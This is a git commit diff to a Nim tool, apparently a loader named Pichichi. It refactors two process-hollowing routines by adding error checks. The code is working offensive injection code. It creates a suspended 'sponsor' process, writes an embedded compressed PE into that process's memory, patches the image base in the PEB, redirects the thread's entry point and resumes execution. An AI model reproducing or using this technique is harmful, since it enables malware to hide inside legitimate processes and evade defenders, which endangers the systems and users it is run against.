e4e38d6a70a29f393bcd0aef1a40292530008885
Itay Migdal <itaymigdal9@gmail.com>
2023-04-14 14:15:08 +0300

    some refactoring in functions

--- Pichichi.nim
+++ Pichichi.nim
@@ -24,12 +24,12 @@ proc simpleHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0)
     var peImageSize = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfImage)
     var peImageImageBase = cast[LPVOID](peImageNtHeaders.OptionalHeader.ImageBase)
     var peImageEntryPoint = cast[PVOID](peImageNtHeaders.OptionalHeader.AddressOfEntryPoint)
-    
+
     # Create sponsor process suspended
     when not defined(release): echo "[*] Creating sponsor process suspended" 
     var si: STARTUPINFOA
     var pi: PROCESS_INFORMATION
-    CreateProcessA(
+    if CreateProcessA(
         NULL,
         sponsorCmd,
         NULL, 
@@ -40,14 +40,14 @@ proc simpleHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0)
         NULL, 
         addr si, 
         addr pi
-    )
+    ) != TRUE:
+        when not defined(release): echo "[-] Could not create process"
+        quit()
 
     let sponsorProcessHandle = pi.hProcess
     let sponsorThreadHandle = pi.hThread
     let sponsorPid = pi.dwProcessId
     let sponsorTid = pi.dwThreadId
-    if sponsorPid == 0:
-        quit()
     
     when not defined(release): echo "[i] Sponsor PID: " & $sponsorPid
     when not defined(release): echo "[i] Sponsor TID: " & $sponsorTid
@@ -56,13 +56,16 @@ proc simpleHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0)
     when not defined(release): echo "[*] Retrieving PEB address" 
     var bi: PROCESS_BASIC_INFORMATION
     var ret: DWORD
-    NtQueryInformationProcess(
+    if NtQueryInformationProcess(
         sponsorProcessHandle,
         0,
         addr bi,
         cast[windef.ULONG](sizeof(bi)),
         addr ret
-    )
+    ) != 0:
+        when not defined(release): echo "[-] Could query sponsor process"   
+        quit()
+    
     let sponsorPeb = bi.PebBaseAddress
     when not defined(release): echo "[i] Sponsor PEB address: 0x" & $cast[int](sponsorPeb).toHex
 
@@ -76,7 +79,7 @@ proc simpleHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0)
         PAGE_EXECUTE_READWRITE
     )
     if newImageBaseAddress != peImageImageBase:
-        when not defined(release): echo "[-] Could not relocate at preffered address - 0x" & $cast[int](peImageImageBase).toHex   
+        when not defined(release): echo "[-] Could not allocate at preffered address - 0x" & $cast[int](peImageImageBase).toHex   
         quit()
      
     when not defined(release): echo "[i] New image base address (preferred): 0x" & $cast[int](newImageBaseAddress).toHex 
@@ -84,45 +87,53 @@ proc simpleHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0)
 
     # Copy PE headers to sponsor process 
     when not defined(release): echo "[*] Copying PE headers to sponsor process"    
-    WriteProcessMemory(
+    if WriteProcessMemory(
         sponsorProcessHandle,
         newImageBaseAddress,
         peBytesPtr,
         peImageSizeOfHeaders,
         NULL
-    )
+    ) != TRUE:
+        when not defined(release): echo "[-] Could not write to sponsor process"
+        quit() 
 
     # Copy PE sections to sponsor process
     when not defined(release): echo "[*] Copying PE sections to sponsor process"    
     for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
-        WriteProcessMemory(
+        if WriteProcessMemory(
             sponsorProcessHandle,
             newImageBaseAddress + peImageSectionsHeader[i].VirtualAddress,
             peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
             peImageSectionsHeader[i].SizeOfRawData,
             NULL
-        )
+        ) != TRUE:
+            when not defined(release): echo "[-] Could not write to sponsor process"
+            quit() 
     
     # Overwrite sponsor PEB with the new image base address 
     when not defined(release): echo "[*] Overwriting PEB with the new image base address"
-    WriteProcessMemory(
+    if WriteProcessMemory(
         sponsorProcessHandle,
         cast[LPVOID](cast[int](sponsorPeb) + 0x10),
         addr newImageBaseAddress,
         8,
         NULL
-    )
+    ) != TRUE:
+        when not defined(release): echo "[-] Could not write to sponsor process"
+        quit() 
 
     # Change sponsor thread Entrypoint
     var context: CONTEXT
     context.ContextFlags = CONTEXT_INTEGER
     if GetThreadContext(sponsorThreadHandle, addr context) == FALSE:
-        when not defined(release): echo "[-] Error calling GetThreadContext()"
+        when not defined(release): echo "[-] Could not read from sponsor process PEB"
+        quit()
     var entryPoint = cast[DWORD64](newImageBaseAddress) + cast[DWORD64](peImageEntryPoint)
     when not defined(release): echo "[i] Changing RCX register to point the new entrypoint: 0x" & $context.Rcx.toHex & " -> 0x" & $entryPoint.toHex
     context.Rcx = cast[DWORD64](entryPoint)
     if SetThreadContext(sponsorThreadHandle, addr context) == FALSE:
-        when not defined(release): echo "[-] Error calling SetThreadContext()"
+        when not defined(release): echo "[-] Could not write to sponsor process PEB"
+        quit()
     
     # Resume remote thread 
     when not defined(release): echo "[*] Resuming remote thread"
@@ -147,11 +158,11 @@ proc nimlineHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0
     var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
     var peImageEntryPoint = cast[PVOID](peImageNtHeaders.OptionalHeader.AddressOfEntryPoint)
     
-    # Create sponsor process suspended
+     # Create sponsor process suspended
     when not defined(release): echo "[*] Creating sponsor process suspended" 
     var si: STARTUPINFOA
     var pi: PROCESS_INFORMATION
-    CreateProcessA(
+    if CreateProcessA(
         NULL,
         sponsorCmd,
         NULL, 
@@ -162,14 +173,14 @@ proc nimlineHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0
         NULL, 
         addr si, 
         addr pi
-    )
+    ) != TRUE:
+        when not defined(release): echo "[-] Could not create process"
+        quit()
 
     let sponsorProcessHandle = pi.hProcess
     let sponsorThreadHandle = pi.hThread
     let sponsorPid = pi.dwProcessId
     let sponsorTid = pi.dwThreadId
-    if sponsorPid == 0:
-        quit()
     
     when not defined(release): echo "[i] Sponsor PID: " & $sponsorPid
     when not defined(release): echo "[i] Sponsor TID: " & $sponsorTid
@@ -178,13 +189,16 @@ proc nimlineHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0
     when not defined(release): echo "[*] Retrieving PEB address" 
     var bi: PROCESS_BASIC_INFORMATION
     var ret: DWORD
-    NtQueryInformationProcess(
+    if NtQueryInformationProcess(
         sponsorProcessHandle,
         0,
         addr bi,
         cast[windef.ULONG](sizeof(bi)),
         addr ret
-    )
+    ) != 0:
+        when not defined(release): echo "[-] Could query sponsor process"   
+        quit()
+    
     let sponsorPeb = bi.PebBaseAddress
     when not defined(release): echo "[i] Sponsor PEB address: 0x" & $cast[int](sponsorPeb).toHex
 
